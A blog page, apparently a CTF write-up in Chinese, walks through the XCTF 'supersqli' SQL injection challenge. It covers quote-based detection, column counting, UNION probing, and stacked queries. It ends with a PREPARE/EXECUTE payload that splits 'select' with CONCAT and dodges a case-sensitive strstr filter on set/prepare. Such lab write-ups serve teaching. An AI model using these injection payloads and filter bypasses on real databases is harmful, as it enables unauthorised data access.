@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="无名小站">
+    <meta name="author" content="Akk0">
+    
+    <title>
+        
+            XCTF-supersqli |
+        
+        Akk0&#39;s Blog
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/avatar.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#CC99FF","avatar":"/images/avatar.jpg","favicon":"/images/avatar.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Welcome to Akk0's Blog."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.0"};
+    KEEP.language_ago = undefined;
+  </script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Akk0's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                Akk0&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">XCTF-supersqli</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Akk0</span>
+                        
+                            <span class="author-label">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2020-08-13 15:09:23
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Web/">Web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Web/">Web</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.2k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>4 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=298 height=52 src="//music.163.com/outchain/player?type=2&id=1469497524&auto=1&height=32"></iframe></div>
+
+<h1 id="题目描述随便注"><a href="#题目描述随便注" class="headerlink" title="题目描述随便注"></a>题目描述随便注</h1><p><img src="https://img-blog.csdnimg.cn/20200806202519863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></p>
+<h1 id="打开链接，查看源码"><a href="#打开链接，查看源码" class="headerlink" title="打开链接，查看源码"></a>打开链接，查看源码</h1><p><img src="https://img-blog.csdnimg.cn/20200806202600101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20200806202625479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>看来没办法使用sqlmap了，采用手注⑧</p>
+<h1 id="判断是否存在sql注入漏洞"><a href="#判断是否存在sql注入漏洞" class="headerlink" title="判断是否存在sql注入漏洞"></a>判断是否存在sql注入漏洞</h1><p>最为经典的一种判断方法是单引号判断法<br>即在参数后面加上单引号，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+<p>如果页面返回错误，则存在sql注入<br>原因是字符型或者是整型都会因为单引号个数不匹配而报错</p>
+<p>尝试注入，的确存在注入漏洞<br><img src="https://img-blog.csdnimg.cn/20200806203536873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></p>
+<h1 id="判断注入漏洞的类型"><a href="#判断注入漏洞的类型" class="headerlink" title="判断注入漏洞的类型"></a>判断注入漏洞的类型</h1><p>注入漏洞分为两种类型</p>
+<ul>
+<li>数字型</li>
+<li>字符型</li>
+</ul>
+<h2 id="数字型判断"><a href="#数字型判断" class="headerlink" title="数字型判断"></a>数字型判断</h2><p>数字型sql语句一般如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">where</span> inject <span class="operator">=</span>  x</span><br></pre></td></tr></table></figure>
+<p>可以通过and 1=1 和 and 1=2进行判断</p>
+<ul>
+<li>在url中输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+返回正常，接着下一步<br><img src="https://img-blog.csdnimg.cn/20200806204316427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></li>
+<li>在url中输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure>
+如果返回错误，即说明为数字型注入</li>
+</ul>
+<p> 尝试后发现仍然正常，说明该处不是数字型注入<br> <img src="https://img-blog.csdnimg.cn/20200806204642360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>解释一下<br>如果为数字型注入，当输入<code>and 1=1</code>时，执行的sql语句如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">where</span> inject<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>无语法错误且逻辑判断为真，返回正常</p>
+<p>当输入<code>and 1=2</code>时，执行的sql语句如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &lt;table_name&gt; where inject&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>无语法错误但逻辑判断为假，返回错误</p>
+<p>如果此题为字符型注入，产生的sql语句如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">where</span> inject<span class="operator">=</span> <span class="string">&#x27;1 and 1=1&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">where</span> inject<span class="operator">=</span> <span class="string">&#x27;1 and 1=2&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>这样的话并不会进行and的逻辑判断，所以这道题应该是字符型注入</p>
+<h2 id="字符型判断"><a href="#字符型判断" class="headerlink" title="字符型判断"></a>字符型判断</h2><p>字符型sql语句一般如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &lt;table_name&gt; where inject &#x3D;  &#39;x&#39;</span><br></pre></td></tr></table></figure>
+<p>可以通过and ‘1’=’1 和 and ‘1’=’2进行判断</p>
+<ul>
+<li>在url中输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+返回正常，接着下一步<br><img src="https://img-blog.csdnimg.cn/20200806205613503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></li>
+<li>在url中输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;2</span><br></pre></td></tr></table></figure>
+返回错误，该题为字符型注入<br><img src="https://img-blog.csdnimg.cn/20200806205808514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></li>
+</ul>
+<h1 id="获取列数"><a href="#获取列数" class="headerlink" title="获取列数"></a>获取列数</h1><p>输入<code>1&#39; order by 1#</code>，即表示 所select的字段按第一个字段排序<br>正常<br><img src="https://img-blog.csdnimg.cn/20200806210214723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br> 输入<code>1&#39; order by 2#</code>，正常</p>
+<p><img src="https://img-blog.csdnimg.cn/20200806210419435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>输入<code>1&#39; order by 3#</code>，报错<br><img src="https://img-blog.csdnimg.cn/20200806210530333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>得出这张表只有两个字段，数据为两列</p>
+<h1 id="尝试联合查询"><a href="#尝试联合查询" class="headerlink" title="尝试联合查询"></a>尝试联合查询</h1><p><strong>union</strong>运算符可以将两个或两个以上的<strong>select</strong>语句的查询结果集合合并成一个结果集显示，即执行联合查询。需要注意的使用<strong>union</strong>查询的时候需要和主查询语句的列数相同，刚才我们查询得出列数为2<br>输入<code>1&#39; union select database(),user()#</code></p>
+<ul>
+<li>database()会返回当前网站所使用的数据库名字</li>
+<li>user()会返回执行当前查询的用户名</li>
+</ul>
+<p>结果如下<br><img src="https://img-blog.csdnimg.cn/20200806211444315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>发现这里过滤了一些语句，无法再进行查询了</p>
+<h1 id="堆叠注入绕过过滤"><a href="#堆叠注入绕过过滤" class="headerlink" title="堆叠注入绕过过滤"></a>堆叠注入绕过过滤</h1><p>堆叠注入：堆叠查询可以执行多条SQL语句，语句之间以分号(;)隔开。而堆叠查询注入攻击就是利用此特点，在第二条语句中构造自己要执行的语句。<br>我们尝试查询所有的表名<br>输入<code>1&#39;;show tables#</code><br><img src="https://img-blog.csdnimg.cn/20200806212019938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>可以发现这里有两张表，分别再查询两张表中的列<br>通过<code>desc table_name</code>语句可以查询一张表中的所有字段<br>输入<code>1&#39;;desc `1919810931114514`#</code>,注意这里为反引号<br><img src="https://img-blog.csdnimg.cn/20200806212737945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>输入<code>1&#39;;desc `words`#</code><br><img src="https://img-blog.csdnimg.cn/20200806212858429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>很显然，flag在第一张表中</p>
+<h1 id="查询flag"><a href="#查询flag" class="headerlink" title="查询flag"></a>查询flag</h1><p>这里采用的是预编译的方式<br>介绍一下预编译的语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt_name FROM preparable_stmt</span><br><span class="line"></span><br><span class="line">EXECUTE stmt_name</span><br><span class="line"> [USING @var_name [, @var_name] ...] -</span><br><span class="line"></span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name</span><br><span class="line"></span><br><span class="line">set用于设置变量名和值</span><br><span class="line">prepare用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute执行语句</span><br><span class="line">deallocate prepare用来释放掉预处理的语句</span><br></pre></td></tr></table></figure>
+<p>举个例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">PREPARE</span> stmt <span class="keyword">FROM</span> <span class="string">&#x27;SELECT ?+?&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="variable">@a</span><span class="operator">=</span><span class="number">1</span>, <span class="variable">@b</span><span class="operator">=</span><span class="number">10</span> ;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">EXECUTE</span> stmt <span class="keyword">USING</span> <span class="variable">@a</span>, <span class="variable">@b</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span> ?<span class="operator">+</span>? <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们已经了解了预编译的用法，接下来再使用堆叠注入<br>这里采用了CONCAT来绕过select的过滤<br>payload为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>sele<span class="string">&#x27;,&#x27;</span>ct <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;#</span></span><br></pre></td></tr></table></figure>
+<p>发现这里还过滤了<strong>set</strong>以及<strong>prepare</strong><br><img src="https://img-blog.csdnimg.cn/2020080621461259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>需要注意的一点是这里使用了strstr对set和prepare关键字进行了检查，但是strstr检查不对大小写进行检查，所以这里可以通过大小写绕过，set和prepare关键字只要有一个是大写就可以绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>Sele<span class="string">&#x27;,&#x27;</span>ct <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);Prepare stmt from @sql;EXECUTE stmt;#</span></span><br></pre></td></tr></table></figure>
+<p>得到flag如下<br><img src="https://img-blog.csdnimg.cn/20200806214858865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：XCTF-supersqli</li>
+        <li>本文作者：Akk0</li>
+        <li>创建时间：2020-08-13 15:09:23</li>
+        <li>
+            本文链接：https://auxein.xyz/2020/08/13/XCTF-supersqli/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/08/14/XCTF-unserialize3/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XCTF-unserialize3</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">Akk0</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.0</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">1.</span> <span class="nav-text">题目描述随便注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%93%E5%BC%80%E9%93%BE%E6%8E%A5%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">打开链接，查看源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">判断是否存在sql注入漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">4.</span> <span class="nav-text">判断注入漏洞的类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD"><span class="nav-number">4.1.</span> <span class="nav-text">数字型判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%88%A4%E6%96%AD"><span class="nav-number">4.2.</span> <span class="nav-text">字符型判断</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E6%95%B0"><span class="nav-number">5.</span> <span class="nav-text">获取列数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">6.</span> <span class="nav-text">尝试联合查询</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="nav-number">7.</span> <span class="nav-text">堆叠注入绕过过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2flag"><span class="nav-number">8.</span> <span class="nav-text">查询flag</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
